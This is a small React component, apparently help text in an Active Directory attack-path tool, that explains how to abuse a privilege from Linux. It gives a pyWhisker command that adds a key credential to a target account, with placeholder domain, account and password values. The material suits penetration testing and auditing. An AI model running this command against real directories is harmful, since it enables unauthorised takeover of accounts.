import React from 'react';
import PropTypes from 'prop-types';

const LinuxAbuse = ({ sourceName, sourceType }) => {
    return (
        <>
            <p>To abuse this privilege, use <a href='https://github.com/ShutdownRepo/pywhisker'>pyWhisker</a>.</p>

            <pre>
                <code>{'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}</code>
            </pre>

            <p>
                For other optional parameters, view the pyWhisker documentation.
            </p>
        </>
    );
};

LinuxAbuse.propTypes = {
    sourceName: PropTypes.string,
    sourceType: PropTypes.string,
};

export default LinuxAbuse;
